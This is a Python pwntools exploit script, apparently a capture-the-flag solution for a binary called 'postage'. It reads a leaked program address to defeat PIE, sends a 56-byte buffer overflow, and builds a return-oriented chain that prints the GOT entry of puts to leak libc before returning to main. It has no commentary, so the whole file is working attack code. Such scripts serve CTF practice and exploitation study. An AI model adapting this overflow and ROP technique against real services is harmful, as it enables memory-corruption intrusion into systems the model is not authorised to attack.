#!/usr/bin/python3

from pwn import *

exe = ELF('postage_patched', checksec=False)
libc = ELF('libc.so.6', checksec=False)
context.binary = exe

def GDB():
        if not args.REMOTE:
                gdb.attach(p, gdbscript='''
                brva 0x1444

                c
                ''')
                input()

info = lambda msg: log.info(msg)
sla = lambda msg, data: p.sendlineafter(msg, data)
sa = lambda msg, data: p.sendafter(msg, data)
sl = lambda data: p.sendline(data)
s = lambda data: p.send(data)

if args.REMOTE:
        p = remote('')
else:
        p = process(exe.path)

GDB()
p.recvlines(2)
p.recvuntil(b'Welcome to  ')
exe.address = int(p.recvline(keepends=False), 16) - 0x1359
info("exe.address: " +hex(exe.address))
sla(b'delivered', '1')
sl('1')
pop_rdi_rsp = exe.address + 0x0000000000001356
payload = b'a'*56 + flat(0, pop_rdi_rsp, exe.got.puts, 0, exe.plt.puts, exe.sym.main)
sla(b'questions?', payload)
sl(payload)
p.interactive()
